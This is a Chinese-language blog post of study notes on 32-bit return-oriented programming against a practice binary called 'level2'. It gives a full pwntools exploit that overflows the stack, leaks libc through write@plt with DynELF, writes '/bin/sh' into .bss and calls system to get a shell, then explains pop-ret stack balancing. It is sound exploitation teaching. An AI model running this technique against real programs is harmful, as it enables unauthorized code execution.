---
title: rop32
date: 2018-08-21 17:50:21
tags:
---

蒸米哥的一步一步学rop
==================

**下面讲一下32为系统溢出注意点**
测试软件地址[https://github.com/tower111/softwroe.git](https://github.com/tower111/softwroe.git)


反编译结果是

{% asset_img image0002  %}

{% image0001 %}(image0001.png)


漏洞很明显了  这里只开了NX保护。


```
from pwn import *

elf=ELF("./level2")
plt_write=elf.plt["write"]
plt_read=elf.plt['read']
vulfun_addr=0x0804842D

def leak(address):
    payload1="a"*140+p32(plt_write)+p32(vulfun_addr)+p32(1)+p32(address)+p32(4)
    p.send(payload1)
    data=p.recv(4)
    print "%#x => %s" % (address, (data or '').encode('hex'))
    return data

p=process("./level2")
#p=remote("127.0.0.1",1000)
d=DynELF(leak,elf=ELF('./level2'))
system_addr=d.lookup('system','libc')

print "system_addr="+hex(system_addr)

bss_addr=0x0804a018

pppr=0x080484bd

payload='a'*140+p32(plt_read)+p32(pppr)+p32(0)+p32(bss_addr)+p32(8)
payload+=p32(system_addr)+p32(vulfun_addr)+p32(bss_addr)


p.send(payload)
p.send("/bin/sh")
p.interactive()

```
这就是payload
**用pop来平衡堆栈，执行ret的时候rsp指向的位置的值会被执行（执行ret指针会移动）**
为什么要这样调整堆栈平衡呢，这就和调用约定有关了。程序每次返回都会调整自己的堆栈，把堆栈调整到call之前。
![image0003](http://i2.bvimg.com/659021/e9a28bdace20bcc0.png)
在这里体现出来就是leave和retn指令而程序返回之后在call外面把堆栈调整回来（不过这里图没有add esp而是直接利用了上次函数调用的时候分配出来的栈）
![image0004](http://i2.bvimg.com/659021/5f9173be7ce5af08.png)
每个call只会负责call出来的时候堆栈是平衡的，而让传进去的参数维持平衡只能靠外层函数。

所以我们构造payload需要找到三个pop来平衡堆栈而调用多少个pop就要看原来有多少个参数，需要谨记的一点就是无论什么时候ret都是把返回地址从esp里面弹出来。
